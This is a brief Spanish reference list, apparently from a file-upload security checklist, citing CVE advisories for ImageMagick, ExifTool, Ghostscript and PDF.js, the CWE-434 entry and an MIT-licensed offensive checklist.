- Avisos: CVE-2016-3714 (ImageTragick), CVE-2022-44268 (ImageMagick), CVE-2021-22204 (ExifTool), CVE-2023-36664 y CVE-2024-29510 (Ghostscript), CVE-2024-4367 (PDF.js)
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- SnailSploit offensive-checklist (File Upload), licencia MIT
